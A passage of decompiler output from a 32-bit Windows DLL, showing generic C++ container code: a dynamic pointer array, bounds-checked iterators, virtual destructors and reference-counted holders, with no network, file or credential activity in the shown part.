  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1000DEED(this, v3, 0);
  else
    v4 = 0;
  sub_1000E730(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000D98B) --------------------------------------------------------
_DWORD *__thiscall sub_1000D98B(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1000E057(this, v3, 0);
  else
    v4 = 0;
  sub_1000E6AC(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000D9DE) --------------------------------------------------------
_DWORD *__thiscall sub_1000D9DE(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1000DEED(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1000E730(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000DA39) --------------------------------------------------------
_DWORD *__thiscall sub_1000DA39(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1000E057(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1000E6AC(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000DA94) --------------------------------------------------------
_DWORD *__thiscall sub_1000DA94(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1000DEED(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1000E730(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000DB09) --------------------------------------------------------
_DWORD *__thiscall sub_1000DB09(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1000E057(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1000E6AC(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000DB7E) --------------------------------------------------------
void __thiscall sub_1000DB7E(_DWORD *this)
{
  *this = &off_100936A4;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100936A4: using guessed type int (__thiscall *off_100936A4)(void *Block, char);

//----- (1000DBA3) --------------------------------------------------------
int __thiscall sub_1000DBA3(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1000DBD1) --------------------------------------------------------
int *__thiscall sub_1000DBD1(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000DEAD(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000DC27: variable 'v5' is possibly undefined

//----- (1000DC39) --------------------------------------------------------
int *__thiscall sub_1000DC39(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000DE18(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000DC8F: variable 'v5' is possibly undefined

//----- (1000DCA1) --------------------------------------------------------
void __thiscall sub_1000DCA1(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1000E76F(v2);
}

//----- (1000DCD9) --------------------------------------------------------
void __thiscall sub_1000DCD9(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1000E76F(v3);
}

//----- (1000DD14) --------------------------------------------------------
void __thiscall sub_1000DD14(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1000E76F(v2);
}

//----- (1000DD4C) --------------------------------------------------------
int __thiscall sub_1000DD4C(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000E6EB(v4);
  return v2;
}

//----- (1000DD88) --------------------------------------------------------
int __thiscall sub_1000DD88(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000E76F(v4);
  return v2;
}

//----- (1000DDC4) --------------------------------------------------------
void __thiscall sub_1000DDC4(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1000E76F(v1);
}

//----- (1000DE18) --------------------------------------------------------
int __usercall sub_1000DE18@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000DE49) --------------------------------------------------------
_DWORD *__thiscall sub_1000DE49(_DWORD *Block, char a2)
{
  sub_1000DB7E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000DE68) --------------------------------------------------------
_DWORD *__thiscall sub_1000DE68(_DWORD *Block, char a2)
{
  *Block = &off_100936DC;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100936DC: using guessed type int (__thiscall *off_100936DC)(void *Block, char);

//----- (1000DE88) --------------------------------------------------------
_DWORD *__thiscall sub_1000DE88(_DWORD *Block, char a2)
{
  *Block = &off_100936FC;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100936FC: using guessed type int (__thiscall *off_100936FC)(void *Block, char);

//----- (1000DEAD) --------------------------------------------------------
int __usercall sub_1000DEAD@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1000DEED) --------------------------------------------------------
_DWORD *__thiscall sub_1000DEED(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100936DC;
  a2[1] = this;
  *a2 = &off_1009371C;
  a2[2] = a3;
  return result;
}
// 100936DC: using guessed type int (__thiscall *off_100936DC)(void *Block, char);
// 1009371C: using guessed type int (__thiscall *off_1009371C)(void *Block, char);

//----- (1000DF21) --------------------------------------------------------
void __thiscall sub_1000DF21(_DWORD *this)
{
  *this = &off_1009371C;
  *this = &off_100936DC;
}
// 100936DC: using guessed type int (__thiscall *off_100936DC)(void *Block, char);
// 1009371C: using guessed type int (__thiscall *off_1009371C)(void *Block, char);

//----- (1000DF46) --------------------------------------------------------
bool __thiscall sub_1000DF46(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1000DF5D) --------------------------------------------------------
BOOL __thiscall sub_1000DF5D(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000DF67) --------------------------------------------------------
int __thiscall sub_1000DF67(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1000DFA2) --------------------------------------------------------
int __thiscall sub_1000DFA2(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1000DFD8) --------------------------------------------------------
int __thiscall sub_1000DFD8(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1000E000) --------------------------------------------------------
int __thiscall sub_1000E000(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1000E03B) --------------------------------------------------------
int __thiscall sub_1000E03B(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1000E057) --------------------------------------------------------
_DWORD *__thiscall sub_1000E057(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100936FC;
  a2[1] = this;
  *a2 = &off_1009373C;
  a2[2] = a3;
  return result;
}
// 100936FC: using guessed type int (__thiscall *off_100936FC)(void *Block, char);
// 1009373C: using guessed type int (__thiscall *off_1009373C)(void *Block, char);

//----- (1000E08B) --------------------------------------------------------
void __thiscall sub_1000E08B(_DWORD *this)
{
  *this = &off_1009373C;
  *this = &off_100936FC;
}
// 100936FC: using guessed type int (__thiscall *off_100936FC)(void *Block, char);
// 1009373C: using guessed type int (__thiscall *off_1009373C)(void *Block, char);

//----- (1000E0B0) --------------------------------------------------------
bool __thiscall sub_1000E0B0(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1000E0C7) --------------------------------------------------------
BOOL __thiscall sub_1000E0C7(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1000E0D1) --------------------------------------------------------
int __thiscall sub_1000E0D1(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1000E10C) --------------------------------------------------------
int __thiscall sub_1000E10C(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1000E142) --------------------------------------------------------
int __thiscall sub_1000E142(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1000E16A) --------------------------------------------------------
int __thiscall sub_1000E16A(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1000E1A5) --------------------------------------------------------
int __thiscall sub_1000E1A5(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1000E1C1) --------------------------------------------------------
_DWORD *__thiscall sub_1000E1C1(_DWORD *Block, char a2)
{
  sub_1000DF21(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E1E0) --------------------------------------------------------
_DWORD *__thiscall sub_1000E1E0(_DWORD *Block, char a2)
{
  sub_1000E08B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E23A) --------------------------------------------------------
LONG __stdcall sub_1000E23A(int *a1)
{
  LONG result; // eax

  result = (LONG)a1;
  if ( *a1 )
    return sub_10016377(*a1);
  return result;
}

//----- (1000E274) --------------------------------------------------------
_DWORD *__stdcall sub_1000E274(_DWORD *a1)
{
  sub_1000E7BF(a1);
  *a1 = &off_10093648;
  sub_1000E7EA(a1);
  return a1;
}
// 10093648: using guessed type int (__thiscall *off_10093648)(void *Block, char);

//----- (1000E2A6) --------------------------------------------------------
void **__thiscall sub_1000E2A6(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (1000E2E8) --------------------------------------------------------
void __thiscall sub_1000E2E8(int this)
{
  *(_DWORD *)this = &off_10093648;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_1000DB7E((_DWORD *)this);
}
// 10093648: using guessed type int (__thiscall *off_10093648)(void *Block, char);

//----- (1000E337) --------------------------------------------------------
int __thiscall sub_1000E337(_DWORD *this)
{
  return this[1];
}

//----- (1000E33B) --------------------------------------------------------
int __thiscall sub_1000E33B(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B7306);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (1000E398) --------------------------------------------------------
int __thiscall sub_1000E398(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (1000E3B3) --------------------------------------------------------
int __thiscall sub_1000E3B3(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B7307);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1000E3FF) --------------------------------------------------------
int __thiscall sub_1000E3FF(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B732A);
  return this[3] + 4 * a2;
}

//----- (1000E420) --------------------------------------------------------
int __thiscall sub_1000E420(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_100B732B);
  return this[3] + 4 * a2;
}

//----- (1000E441) --------------------------------------------------------
void __thiscall sub_1000E441(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (1000E466) --------------------------------------------------------
int __thiscall sub_1000E466(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1000E48A) --------------------------------------------------------
BOOL __thiscall sub_1000E48A(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1000E495) --------------------------------------------------------
int __thiscall sub_1000E495(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1000E4D7) --------------------------------------------------------
unsigned int __thiscall sub_1000E4D7(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_100B7342);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1000E549) --------------------------------------------------------
unsigned int __thiscall sub_1000E549(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1000E571) --------------------------------------------------------
unsigned int __stdcall sub_1000E571(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1000E584) --------------------------------------------------------
unsigned int __thiscall sub_1000E584(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000E5E2) --------------------------------------------------------
void __thiscall sub_1000E5E2(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000E6AC) --------------------------------------------------------
_DWORD *__userpurge sub_1000E6AC@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000E6EB) --------------------------------------------------------
void __thiscall sub_1000E6EB(void *this)
{
  sub_1000E81F((int)this);
}

//----- (1000E730) --------------------------------------------------------
_DWORD *__userpurge sub_1000E730@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000E76F) --------------------------------------------------------
void __thiscall sub_1000E76F(void *this)
{
  sub_1000E859((int)this);
}

//----- (1000E7A0) --------------------------------------------------------
void *__thiscall sub_1000E7A0(void *Block, char a2)
{
  sub_1000E2E8((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E7BF) --------------------------------------------------------
_DWORD *__stdcall sub_1000E7BF(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_100936A4;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100936A4: using guessed type int (__thiscall *off_100936A4)(void *Block, char);

//----- (1000E7EA) --------------------------------------------------------
void *__usercall sub_1000E7EA@<eax>(_DWORD *a1@<esi>)
{
  void *result; // eax

  a1[1] = 0;
  a1[2] = 16;
  result = operator new(0x40u);
  a1[3] = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000E81F) --------------------------------------------------------
void __usercall sub_1000E81F(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000E859) --------------------------------------------------------
void __usercall sub_1000E859(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000E895) --------------------------------------------------------
unsigned int __usercall sub_1000E895@<eax>(int a1@<eax>)
{
